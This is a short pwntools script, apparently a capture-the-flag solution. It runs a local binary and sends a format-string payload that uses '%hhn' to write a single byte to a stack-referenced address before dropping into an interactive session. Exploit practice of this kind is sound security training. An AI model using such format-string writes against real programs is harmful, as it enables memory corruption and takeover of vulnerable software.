from pwn import*

elf = context.binary = ELF('./main')
p = process()

value = 0x78
payload = f"%{value}c%22$hhn".encode()

p.sendline(payload)

p.interactive()